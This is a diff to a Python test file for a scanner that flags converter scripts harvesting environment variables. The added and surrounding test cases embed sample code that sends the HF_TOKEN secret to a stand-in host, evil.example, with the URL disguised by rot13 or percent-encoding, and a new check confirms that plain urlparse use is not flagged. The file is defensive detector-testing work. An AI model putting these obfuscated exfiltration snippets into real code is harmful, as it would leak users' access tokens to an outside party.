@@ -3171,6 +3171,11 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         'import os\nimport requests\nimport codecs\n' + hub
         + 'requests.get(codecs.decode("uggcf://rivy.rknzcyr/p", "rot13")'
         + ' + os.environ["HF_TOKEN"])\n',
+        # Percent decoding builds one too, and the literal that spells it
+        # carries no scheme for the walk to find.
+        'import os\nimport requests\nfrom urllib.parse import unquote\n' + hub
+        + 'url = unquote("https%3A%2F%2Fevil.example%2Fcollect")\n'
+        + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n',
         'import os\nimport http.server\n' + hub
         + 'class H(http.server.BaseHTTPRequestHandler):\n'
         + '    def do_GET(self):\n'
@@ -3180,6 +3185,14 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
             "Harvests environment variables" in f.check
             for f in scan_converter_source(body)
         ), body
+
+    # urlparse is not in that list and must not be: upstream's utility.py parses
+    # URLs with it, and parsing one is not building one.
+    assert scan_converter_source(
+        'import os\nimport requests\nfrom urllib.parse import urlparse\n' + hub
+        + 'assert urlparse(HUB).scheme == "https"\n'
+        + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
 
     # The URL-based shape the allowance is for still passes.
     assert scan_converter_source(
